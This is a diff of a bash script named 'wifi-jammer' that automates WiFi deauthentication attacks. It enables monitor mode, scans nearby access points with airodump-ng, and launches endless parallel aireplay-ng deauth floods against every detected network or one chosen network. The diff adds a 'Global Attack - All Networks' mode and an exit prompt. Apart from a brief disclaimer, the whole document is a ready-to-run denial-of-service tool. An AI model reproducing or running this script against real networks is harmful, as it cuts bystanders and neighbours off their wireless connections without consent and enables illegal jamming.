@@ -1,19 +1,29 @@
 #!/bin/bash
-sudo apt install aircrack-ng  xterm  
 
-# Root check
-if [[ $EUID -ne 0 ]]; then echo -e "\e[31m root accesss needed !\e[0m"; exit 1; fi
 
-# Required tools
+
+#  ROOT CHECK 
+if [[ $EUID -ne 0 ]]; then 
+    echo -e "\e[31m[!] Root access is required. Run this script as root.\e[0m"
+    exit 1
+fi
+
+# DEPENDENCIES 
+sudo apt install -y aircrack-ng xterm
+
+#  TOOL CHECK 
 for cmd in airmon-ng airodump-ng aireplay-ng xterm iwconfig; do
-  if ! command -v "$cmd" &>/dev/null; then echo -e "\e[31m $cmd not installed!\e[0m"; exit 1; fi
+  if ! command -v "$cmd" &>/dev/null; then 
+    echo -e "\e[31m[!] $cmd not found. Please install it.\e[0m"
+    exit 1
+  fi
 done
 
-# Colors
-RED="\e[31m"; GREEN="\e[32m"; CYAN="\e[36m"; YELLOW="\e[33m"; 
+# -------------------- COLORS --------------------
+RED="\e[31m"; GREEN="\e[32m"; CYAN="\e[36m"; YELLOW="\e[33m";
 PURPLE="\e[35m"; BLUE="\e[34m"; RESET="\e[0m"; BOLD="\e[1m"
 
-# Animations
+# -------------------- ANIMATION --------------------
 attack_animation() {
     local i=0
     local frames=("💥" "🔥" "⚡" "💣")
@@ -24,63 +34,66 @@ attack_animation() {
     done
 }
 
-# Header
+# -------------------- HEADER --------------------
 clear
 echo -e "${RED}${BOLD}"
+echo "         .__  _____.__               __                                      "
+echo " __  _  _|__|/ ____\__|             |__|____    _____   _____   ___________  "
+echo " \ \/ \/ /  \   __\|  |  ______     |  \__  \  /     \ /     \_/ __ \_  __ \ "
+echo "  \     /|  ||  |  |  | /_____/     |  |/ __ \|  Y Y  \  Y Y  \  ___/|  | \/ "
+echo "   \/\_/ |__||__|  |__|         /\__|  (____  /__|_|  /__|_|  /\___  >__|    "
+echo "                                \______|    \/      \/      \/     \/        "
 
-echo -e "${RED}${BOLD}"
-echo "          _________________      ________                             _____                "
-echo "___      ____(_)__  __/__(_)     ______(_)_____ _______ __________ ______(_)_____________ _"
-echo "__ | /| / /_  /__  /_ __  /___________  /_  __ \`/_  __ \`__ \\_  __ \`__ \\_  /__  __ \\_  __ \`/"
-echo "__ |/ |/ /_  / _  __/ _  /_/_____/___  / / /_/ /_  / / / / /  / / / / /  / _  / / /  /_/ / "
-echo "____/|__/ /_/  /_/    /_/        ___  /  \\__,_/ /_/ /_/ /_//_/ /_/ /_//_/  /_/ /_/_\\__, /  "
-echo "                                 /___/                                            /____/   "
-
-echo -e "================================================================================"
 echo -e "${RESET}"
-echo -e "${CYAN}AP-only focused, AGGRESSIVE deauth tool.${RESET}\n"
-echo -e "${RED}${BOLD}⚠️  Disclaimer: ${Reset} I am not responsible for any misuse of this tool. "
-echo -e "${Reset}                                                            by${BOLD}${GREEN} RAEF"
-read -p "🔓 Press ENTER to begin network assault..."
 
-# Interface selection
+echo -e "${CYAN}${BOLD}WiFi DEAUTH ATTACK TOOL - Aggressive Edition${RESET}"
+echo -e "${RED}${BOLD}⚠️  Disclaimer: ${RESET}This tool is for educational use only. I am not responsible for misuse."
+echo -e "                                                  by ${BOLD}${GREEN}RAEF${RESET}"
+echo -e "\n"
+read -p "🔓 Press ENTER to begin scanning for nearby networks..."
+
+# -------------------- INTERFACE SELECTION --------------------
 mapfile -t interfaces < <(iw dev | awk '$1=="Interface"{print $2}')
-[[ ${#interfaces[@]} -eq 0 ]] && echo -e "${RED}❌ No wireless interfaces found.${RESET}" && exit 1
+if [[ ${#interfaces[@]} -eq 0 ]]; then
+    echo -e "${RED}[!] No wireless interfaces found.${RESET}"
+    exit 1
+fi
 
 echo -e "\n${YELLOW}${BOLD}Available Interfaces:${RESET}"
-for i in "${!interfaces[@]}"; do echo -e " ${GREEN}[$i]${RESET} ${BLUE}${interfaces[$i]}${RESET}"; done
+for i in "${!interfaces[@]}"; do 
+    echo -e " ${GREEN}[$i]${RESET} ${BLUE}${interfaces[$i]}${RESET}"
+done
 read -p "Select interface: " iface_idx
 iface="${interfaces[$iface_idx]}"
 
-# Monitor mode setup
-echo -e "\n${CYAN}🔧 Configuring ${YELLOW}$iface${CYAN} for monitor mode...${RESET}"
+# -------------------- MONITOR MODE SETUP --------------------
+echo -e "\n${CYAN}🔧 Enabling monitor mode on ${YELLOW}$iface${CYAN}...${RESET}"
 airmon-ng check kill &>/dev/null
 ip link set "$iface" down
 iw dev "$iface" set type monitor
 ip link set "$iface" up
 iw dev "$iface" set power_save off
 
-# Scan for networks with visible progress
+# -------------------- SCANNING --------------------
 scan_file="scan_$(date +%s)"
-echo -e "\n${GREEN}📡 Scanning for targets - watch the scan window (10 seconds)...${RESET}"
-echo -e "${YELLOW}The scan window will close automatically after 10 seconds.${RESET}"
+echo -e "\n${GREEN}📡 Scanning for targets - window will auto close in 10s...${RESET}"
 sleep 2
-
-# Run scan in  xterm window
 xterm -T "WiFi Scan" -geometry 100x30 -e "timeout 10s airodump-ng --write $scan_file --output-format csv $iface" &
 scan_pid=$!
 
-# Countdown timer
-echo -ne "\r${CYAN}⏱️  Time remaining: 10 seconds${RESET}"
 for i in {9..1}; do
-    sleep 1
     echo -ne "\r${CYAN}⏱️  Time remaining: $i seconds${RESET}"
-done
-echo -e "\r${GREEN}✅ Scan complete - Targets acquired${RESET}"
+    sleep 1
 
-# Parse APs
+done
+echo -e "\r${GREEN}Scan complete.${RESET}"
+
+# -------------------- PARSE SCAN --------------------
 csv_file="${scan_file}-01.csv"
-[[ ! -f "$csv_file" ]] && echo -e "${RED}❌ No networks detected.${RESET}" && exit 1
+if [[ ! -f "$csv_file" ]]; then 
+    echo -e "${RED}[!] No networks detected.${RESET}"
+    exit 1
+fi
 
 mapfile -t aps < <(awk -F',' '
   NR > 1 && $1 ~ /^[0-9A-F:]{17}$/ && $14 != "" {
@@ -88,63 +101,89 @@ mapfile -t aps < <(awk -F',' '
     print $1 "|" $4 "|" $14
   }' "$csv_file" 2>/dev/null)
 
-[[ ${#aps[@]} -eq 0 ]] && echo -e "${RED}❌ No viable targets found.${RESET}" && exit 1
+if [[ ${#aps[@]} -eq 0 ]]; then
+    echo -e "${RED}[!] No viable AP targets found.${RESET}"
+    exit 1
+fi
 
-# Display target summary
-echo -e "\n${PURPLE}${BOLD}🎯 Detected Targets:${RESET}"
-echo -e "${YELLOW}-----------------------------------------------${RESET}"
+# -------------------- DISPLAY TARGETS --------------------
+echo -e "\n${PURPLE}${BOLD}🎯 Detected Networks:${RESET}"
+echo -e "${YELLOW}------------------------------------------------${RESET}"
 printf "${BOLD}%-20s %-4s %s${RESET}\n" "BSSID" "CH" "ESSID"
 for ap in "${aps[@]}"; do
     IFS='|' read -r bssid channel essid <<< "$ap"
     printf "%-20s %-4s %s\n" "$bssid" "$channel" "$essid"
 done
-echo -e "${YELLOW}-----------------------------------------------${RESET}"
-echo -e "${RED}${BOLD}Total targets: ${#aps[@]}${RESET}"
+echo -e "${YELLOW}------------------------------------------------${RESET}"
+echo -e "${RED}${BOLD}Total networks found: ${#aps[@]}${RESET}"
 
-# Trap cleanup
+# -------------------- ATTACK MODE SELECTION --------------------
+echo -e "\n${CYAN}${BOLD}[0] Global Attack - All Networks"
+echo -e "[1] Single Network Target${RESET}"
+read -p "Choose attack mode [0/1]: " mode
+
+if [[ "$mode" == "1" ]]; then
+    echo -e "\n${YELLOW}Select the target network index:${RESET}"
+    for i in "${!aps[@]}"; do
+        IFS='|' read -r bssid channel essid <<< "${aps[$i]}"
+        echo -e "${GREEN}[$i]${RESET} $essid (CH: $channel)"
+    done
+    read -p "Target index: " sel
+    selected=("${aps[$sel]}")
+else
+    selected=("${aps[@]}")
+fi
+
+# -------------------- CLEANUP ON EXIT --------------------
 cleanup() {
-    echo -e "\n${YELLOW}${BOLD} Terminating attacks and restoring network...${RESET}"
+    echo -e "\n${YELLOW}${BOLD}⚙️  Stopping attacks and restoring interface...${RESET}"
     killall aireplay-ng xterm &>/dev/null
     ip link set "$iface" down
     iw dev "$iface" set type managed
     ip link set "$iface" up
     service NetworkManager restart &>/dev/null
     rm -f "$csv_file" "$scan_file"-*
-    echo -e "${GREEN}${BOLD} System restored. Operation complete.${RESET}"
+    echo -e "${GREEN}${BOLD}Network restored. Goodbye.${RESET}"
     exit 0
 }
 trap cleanup INT
 
-# Launch attacks
-echo -e "\n${RED}${BOLD}💣 Initializing assault on ${#aps[@]} networks...${RESET}"
+# -------------------- LAUNCH ATTACK --------------------
+echo -e "\n${RED}${BOLD}💣 Launching attack...${RESET}"
 attack_animation &
 attack_pid=$!
 
-for ap in "${aps[@]}"; do
+for ap in "${selected[@]}"; do
   IFS='|' read -r bssid channel essid <<< "$ap"
   iw dev "$iface" set channel "$channel"
   sanitized_essid="${essid//[^a-zA-Z0-9]/_}"
-  
-  # Launch 5 parallel deauth attacks per AP
   for i in {1..5}; do
-    xterm -geometry 100x15 -bg black -fg red -T "BLASTING $essid" \
-      -e "while true; do aireplay-ng --ignore-negative-one --deauth 0 -a $bssid $iface; sleep 0.5; done" &
+    xterm -geometry 100x15 -bg black -fg red -T "ATTACKING $essid" \
+      -e "while true; do aireplay-ng --ignore-negative-one --deauth 10 -a $bssid $iface; sleep 1; done" &
     sleep 0.2
   done
+  sleep 2
+
 done
 
-echo -e "\r${RED}${BOLD}🔥 FULL SPECTRUM ASSAULT ACTIVE ${RESET}${PURPLE}${BOLD}🔥${RESET}"
-echo -e "${YELLOW}${BOLD}Attacking ${#aps[@]} networks with ${#aps[@]}*5 attack channels${RESET}"
-echo -e "\n${RED}${BOLD}🚫 PRESS CTRL+C TO STOP ATTACKS AND RESTORE NETWORK${RESET}"
-
-# Main loop
+# -------------------- EXIT CONFIRM --------------------
 while true; do
-    sleep 1
+    echo -e "\n${YELLOW}${BOLD}Do you want to stop the attack and restore your network? (y/n): ${RESET}"
+    read -r answer
+    case $answer in
+        [Yy]*)
+            kill $attack_pid
+            cleanup
+            ;;
+        [Nn]*)
+            echo -e "${GREEN}🛡️  Continuing attack... Press Ctrl+C to terminate.${RESET}"
+            ;;
+        *)
+            echo -e "${RED}Invalid input. Type 'y' or 'n'.${RESET}"
+            ;;
+    esac
+    sleep 3
+
 done
 
-# Clean up animation when done
-kill $attack_pid
-cleanup
 #by raef
-
-#Sry if I mess with english words 
